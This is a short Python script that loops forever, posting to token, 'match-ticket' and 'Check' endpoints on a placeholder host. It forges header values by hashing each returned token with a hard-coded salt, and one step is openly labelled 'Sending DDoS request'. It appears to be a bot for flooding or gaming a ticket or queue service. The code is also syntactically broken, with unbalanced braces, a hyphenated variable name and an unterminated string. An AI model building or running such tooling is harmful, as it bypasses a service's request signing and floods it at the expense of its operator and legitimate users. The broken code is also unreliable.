import requests
import json
import hashlib



        
while(1):
    
                    print( "************* Doing magic-1 **************")

                    payload1 = {"An identifier"}}
                    r1 = "https://XYZ.com/get_that_token"
                    headers1= {'Content-Type': 'application/json; charset=UTF-8', 'Content-Length' : '780','Connection': 'close','Accept-Encoding': 'gzip, deflate','User-Agent': 'anonymous/3.10.0'}
                    req1= requests.post(r1, data=json.dumps(payload1), headers = headers1)
                    '''print(req1.text)'''
                    data = req1.json()
                    last= data['Gen']['Tok']
                    '''print('last: ' + last)'''
                    salt= 'sensitive salt'

                    hast= hashlib.sha256(last.encode() + salt.encode()).hexdigest()
                    '''print('hast: ' + hast)'''


                    print("********** Sending DDoS request ***********" )

                    payload2= {"valid user info"}
                    r2= "https://XYZ.com/match-ticket"
                    headers2= {'last': last , 'hast': hast , 'Content-Type': 'application/json; charset=UTF-8', 'Content-Length' : '190','Connection': 'close','Accept-Encoding': 'gzip, deflate','User-Agent': 'Anonymous/3.10.0'}
                    req2= requests.post(r2, data=json.dumps(payload2), headers = headers2)
                    '''print(req2.text)'''
                    data2 = req2.json()

                    match-ticket = str(data2['match']['ticket'])
                    yourID = str(data2['match']['Id'])
                    Check = str(data2['match']['check'])

                    print('match-ticket: ' + match-ticket)
                    print('yourID: ' + yourID)

                    if match-ticket == 'None':
                        print("========== got error ========")
                    else:
                        print("*********** Doing magic-2 **********")

                        payload3 = {"An identifier"}}
                        r3 = "https://XYZ.com/get_that_token"
                        headers3= {'Content-Type': 'application/json; charset=UTF-8', 'Content-Length' : '78','Connection': 'close','Accept-Encoding': 'gzip, deflate','User-Agent': 'Anonymous/3.10.0'}
                        req3= requests.post(r3, data=json.dumps(payload3), headers = headers3)
                        '''print(req3.text)'''
                        data3 = req3.json()
                        last2= data3['Gen']['Tok']
                        '''print('last2: ' + last2)'''
                        salt= 'sensitive salt'

                        hast2= hashlib.sha256(last2.encode() + salt.encode()).hexdigest()
                        '''print('hast2: ' + hast2)'''


                        
                        print("************ checking list **************")
                        

                        payload4= {"valid user info"}
                        r4= "https://XYZ.com/Check"
                        headers4= {'last': last2 , 'hast': hast2 , 'Content-Type': 'application/json; charset=UTF-8', 'Content-Length' : '160','Connection': 'close','Accept-Encoding': 'gzip, deflate','User-Agent': 'Anonymous/3.10.0'}
                        req4= requests.post(r4, data=json.dumps(payload4), headers = headers4)
                        '''print(req2.text)'''
                        data4 = req4.json()

                        hoooold = str(data4['Pending']['Size'])
                        

                        print('=============================> Here you're : ' + hoooold)

